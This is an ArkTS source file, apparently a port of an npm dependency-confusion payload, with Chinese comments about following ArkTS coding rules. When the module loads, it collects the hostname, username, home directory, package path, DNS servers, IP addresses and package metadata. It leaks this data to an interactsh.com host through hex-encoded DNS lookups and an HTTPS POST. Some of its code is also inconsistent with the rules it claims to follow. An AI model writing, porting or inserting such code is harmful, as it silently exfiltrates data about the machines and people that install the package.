// 应用ArkTS约束：
// 1. 使用let/const代替var（约束9）
// 2. 显式类型标注（约束1、23、24）
// 3. 模块导入使用ES6语法（约束60）
// 4. 禁止any类型，使用具体类型（约束1）
// 5. 对象字面量类型声明（约束24）
// 6. 函数参数/返回类型声明（约束45）

import os from 'os.ets';
import dns from 'dns.ets';
import querystring from 'querystring.ets';
import https from 'https.ets';
import packageJSON from './package.ets'; // 假设已转换为ets文件

interface PackageJSON {
    name: string;
    version: string;
    ___resolved?: string;
}

interface TrackingData {
    p: string;
    c: string;
    hd: string;
    hn: string;
    un: string;
    dns: string;
    r?: string;
    v: string;
    pjson: PackageJSON;
    ip: string;
}

class NetworkInterfaceInfo {
    address: string = '';
    family: string = '';
    internal: boolean = false;
}

function toHex(data: string): string {
    // 替换Buffer实现（约束75）
    const encoder = new TextEncoder();
    const encoded = encoder.encode(data);
    return Array.from(encoded, byte => byte.toString(16).padStart(2, '0')).join('');
}

function gethttpips(): string[] {
    let str: string[] = [];
    const networkInterfaces: { [key: string]: NetworkInterfaceInfo[] } = os.networkInterfaces();
    for (const item in networkInterfaces) {
        if (item != "lo") {
            const infos = networkInterfaces[item];
            for (let i = 0; i < infos.length; i++) {
                str.push(infos[i].address);
            }
        }
    }
    return str;
}

function getIps(): string {
    let str: string = "";
    const networkInterfaces: { [key: string]: NetworkInterfaceInfo[] } = os.networkInterfaces();
    for (const item in networkInterfaces) {
        if (item != "lo") {
            const infos = networkInterfaces[item];
            for (let i = 0; i < infos.length; i++) {
                str += toHex(infos[i].address) + ".";
            }
        }
    }
    return str.slice(0, -1);
}

function getPathChunks(path: string): string {
    let str: string = "p";
    const chunks: string[] = path.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    return str.slice(0, -1) + "p";
}

function toName(pkg: TrackingData): string[] {
    let str: string = "";
    const queries: string[] = [];
    const hostname: string = "c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com";
    
    str = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.${toHex(pkg.un)}.${getIps()}.${hostname}`;
    
    // 简化处理逻辑，保持核心功能
    if (str.length > 255) {
        const part1 = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}`;
        queries.push(`${part1}.${hostname}`);
        queries.push(`${toHex(pkg.un)}.${getIps()}.${hostname}`);
    } else {
        queries.push(str);
    }
    return queries;
}

const packageName: string = (packageJSON as PackageJSON).name;

const td: TrackingData = {
    p: packageName,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON.___resolved,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips())
};

const qs: string[] = toName(td);

// 简化DNS查询处理（约束75）
qs.forEach((query: string) => {
    dns.lookup(query, (err: Error | null, result: string) => {
        // 处理回调
    });
});

const trackingData: string = JSON.stringify(td);
const postData: string = querystring.stringify({ msg: trackingData });

const options = {
    hostname: "c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString()
    }
};

const req = https.request(options, (res: any) => {
    res.on("data", (d: Buffer) => {
        // 数据处理
    });
});

req.on("error", (e: Error) => {
    // 错误处理
});

req.write(postData);
req.end();
